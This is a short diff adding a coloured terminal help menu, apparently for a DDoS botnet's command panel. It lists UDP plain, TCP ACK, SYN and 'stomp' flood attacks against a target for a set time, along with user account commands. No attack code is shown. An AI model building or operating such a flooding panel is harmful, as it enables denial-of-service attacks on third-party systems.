@@ -1,0 +1,8 @@
+\x1b[38;2;176;0;0mAttack vectors:\x1b[0m \x1b[38;5;15mudp <target> <time> [...options]\x1b[0m
+  \x1b[38;2;197;202;73m-\x1b[0m \x1b[38;2;176;0;0mudpplain\x1b[0m   \x1b[38;5;15mUDP plain flood\x1b[0m
+  \x1b[38;2;197;202;73m-\x1b[0m \x1b[38;2;176;0;0mack\x1b[0m        \x1b[38;5;15mTCP ACK flood\x1b[0m
+  \x1b[38;2;197;202;73m-\x1b[0m \x1b[38;2;176;0;0msyn\x1b[0m        \x1b[38;5;15mTCP SYN flood\x1b[0m
+  \x1b[38;2;197;202;73m-\x1b[0m \x1b[38;2;176;0;0mstomp\x1b[0m      \x1b[38;5;15mTCP legit, stomp flood\x1b[0m
+\x1b[38;2;176;0;0mCommands:\x1b[0m
+  \x1b[38;2;197;202;73m-\x1b[0m \x1b[38;2;176;0;0maccount\x1b[0m   \x1b[38;5;15mSee your account stats\x1b[0m
+  \x1b[38;2;197;202;73m-\x1b[0m \x1b[38;2;176;0;0mpasswd\x1b[0m    \x1b[38;5;15mChange your account password\x1b[0m
